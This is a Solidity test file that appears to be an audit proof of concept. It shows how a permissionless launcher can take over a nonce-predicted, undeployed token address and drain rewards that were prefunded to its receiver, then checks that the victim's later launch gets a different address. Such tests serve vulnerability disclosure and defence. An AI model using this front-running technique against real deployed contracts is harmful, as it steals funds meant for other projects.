// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IJBToken} from "@bananapus/core-v6/src/interfaces/IJBToken.sol";
import {TestBaseWorkflow} from "@bananapus/core-v6/test/helpers/TestBaseWorkflow.sol";
import {JBTokenDistributor} from "@bananapus/distributor-v6/src/JBTokenDistributor.sol";
import {IJBDistributor} from "@bananapus/distributor-v6/src/interfaces/IJBDistributor.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IREVLoans} from "@rev-net/core-v6/src/interfaces/IREVLoans.sol";
import {IREVOwner} from "@rev-net/core-v6/src/interfaces/IREVOwner.sol";

import {JBStickyDeployer} from "../../src/JBStickyDeployer.sol";
import {JBStickyRewardReceiverFactory} from "../../src/JBStickyRewardReceiverFactory.sol";

contract DaybreakMintableToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address beneficiary, uint256 amount) external {
        _mint({account: beneficiary, value: amount});
    }
}

/// @notice Demonstrates that prefunding a receiver for an undeployed, nonce-predicted Sticky token lets the next
/// permissionless launcher take that token address and its rewards.
contract DaybreakCounterfactualTokenCaptureTest is TestBaseWorkflow {
    address internal _attacker = makeAddr("counterfactual token attacker");
    address internal _victim = makeAddr("counterfactual token victim");

    JBStickyDeployer internal _deployer;
    JBTokenDistributor internal _distributor;
    JBStickyRewardReceiverFactory internal _receiverFactory;
    DaybreakMintableToken internal _rewardToken;

    function setUp() public override {
        super.setUp();

        _deployer = new JBStickyDeployer({controller: jbController(), terminal: jbMultiTerminal()});
        _distributor = new JBTokenDistributor({
            directory: jbDirectory(),
            controller: jbController(),
            revLoans: IREVLoans(address(0)),
            revOwner: IREVOwner(address(0)),
            initialRoundDuration: 1 days,
            initialVestingRounds: 1,
            initialClaimDuration: 30 days
        });
        _receiverFactory = new JBStickyRewardReceiverFactory(IJBDistributor(address(_distributor)));
        _rewardToken = new DaybreakMintableToken("Victim reward", "RWD");
    }

    function test_nextLauncherCapturesRewardsSentForUndeployedStickyToken() public {
        // The hook consumed deployer nonce 1 in the constructor, so the next launch's Sticky token will use nonce 2.
        address victimExpectedStickyToken = vm.computeCreateAddress(address(_deployer), 2);
        assertEq(victimExpectedStickyToken.code.length, 0);

        // The advertised counterfactual flow lets rewards arrive at the future token's receiver before either exists.
        address prefundedReceiver = _receiverFactory.predictReceiverOf(victimExpectedStickyToken);
        uint256 reward = 100e18;
        _rewardToken.mint({beneficiary: prefundedReceiver, amount: reward});

        // A permissionless attacker launches first and therefore receives the exact token address the victim used.
        DaybreakMintableToken attackerUnderlying = new DaybreakMintableToken("Attacker asset", "ATK");
        uint256 fee = jbProjects().creationFee();
        vm.deal(_attacker, fee);
        vm.prank(_attacker);
        uint256 attackerProjectId = _deployer.deployStickyFor{value: fee}({
            stakedToken: IERC20Metadata(address(attackerUnderlying)),
            name: "Captured future token",
            symbol: "CAP",
            projectUri: "",
            cashOutTaxRate: 0,
            granters: new address[](0),
            soulbound: true
        });
        IJBToken attackerStickyToken = jbTokens().tokenOf(attackerProjectId);
        assertEq(address(attackerStickyToken), victimExpectedStickyToken);

        // The attacker cheaply becomes the entire active supply before settling the victim's reward arrival.
        attackerUnderlying.mint({beneficiary: _attacker, amount: 1e18});
        vm.startPrank(_attacker);
        attackerUnderlying.approve({spender: address(jbMultiTerminal()), value: 1e18});
        jbMultiTerminal().pay({
            projectId: attackerProjectId,
            token: address(attackerUnderlying),
            amount: 1e18,
            beneficiary: _attacker,
            minReturnedTokens: 1,
            memo: "",
            metadata: bytes("")
        });
        vm.stopPrank();
        vm.roll(vm.getBlockNumber() + 1);

        assertEq(
            _receiverFactory.settleFor({stickyToken: victimExpectedStickyToken, token: IERC20(address(_rewardToken))}),
            reward
        );

        // Once the allocation vests, the attacker collects the entire reward pot.
        vm.warp(_distributor.roundStartTimestamp(1) + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256[] memory ids = new uint256[](1);
        ids[0] = uint256(uint160(_attacker));
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(_rewardToken));
        _distributor.beginVesting({hook: victimExpectedStickyToken, tokenIds: ids, tokens: tokens});
        vm.warp(_distributor.roundStartTimestamp(3));
        vm.roll(vm.getBlockNumber() + 1);
        _distributor.collectVestedRewards({
            hook: victimExpectedStickyToken, tokenIds: ids, tokens: tokens, beneficiary: _attacker
        });
        assertEq(_rewardToken.balanceOf(_attacker), reward);

        // The victim's eventual launch receives a different share-token address and has no claim on the prefunding.
        DaybreakMintableToken victimUnderlying = new DaybreakMintableToken("Victim asset", "VIC");
        vm.deal(_victim, fee);
        vm.prank(_victim);
        uint256 victimProjectId = _deployer.deployStickyFor{value: fee}({
            stakedToken: IERC20Metadata(address(victimUnderlying)),
            name: "Victim Sticky",
            symbol: "sVIC",
            projectUri: "",
            cashOutTaxRate: 0,
            granters: new address[](0),
            soulbound: true
        });
        assertNotEq(address(jbTokens().tokenOf(victimProjectId)), victimExpectedStickyToken);
    }
}
